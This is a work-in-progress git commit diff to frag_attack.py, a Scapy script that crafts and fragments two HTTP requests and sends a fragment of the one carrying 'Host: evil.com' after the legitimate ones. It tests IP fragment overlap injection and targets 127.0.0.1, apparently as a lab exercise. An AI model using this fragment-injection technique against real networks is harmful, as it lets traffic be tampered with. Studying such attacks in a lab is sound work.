94088396338dfa28df3b45961326ee3f2fc0e8de
Jordon Wing <jordonwii@gmail.com>
2017-03-06 22:40:22 -0800

    [WIP] frag attack stuff

--- frag_attack.py
+++ frag_attack.py
@@ -10,7 +10,22 @@ dstIP = "127.0.0.1"
 #frags[1][IP].frag = 7 
 
 orig_host = "Host: google.com\n\n"
-new = "Host: evil.com\n\n"
+new = "Host: evil.com\n\nthis packet is longer"
+s = "HTTP/1.1 GET /?aaaaaaaa\n"
+l = len(s)
+
+pkt1 = IP(dst=dstIP) / TCP(sport=8000, dport=80) / (s + orig_host)
+pkt2 = IP(dst=dstIP) / TCP(sport=8000, dport=80) / (s + new)
+
+pkts = fragment(pkt1, l + 40)
+pkts_evil = fragment(pkt2, l + 40)
+
+send(pkts)
+bad_p = pkts_evil[1]
+send(bad_p)
+#bad_p.frag = 
+
+"""
 pkts = scapy.plist.PacketList()
 # TCP(sport=8000, dport=80)/(
 pkts.append(IP(dst=dstIP, flags="MF", frag=0)/("a" * 20 + "HTTP/1.1 GET /?=aaaa"))
@@ -20,7 +35,7 @@ pkts.append(IP(dst=dstIP, flags="MF", frag=2)/("4"*16 + new + '4'*(40 - 16 - len
 pkts.append(IP(dst=dstIP, flags="MF", frag=7)/("5"*32))
 pkts.append(IP(dst=dstIP,  frag=10)/("6"*32))
 send(pkts)
-"""
+
 def s1():
     send(frags[0])
     
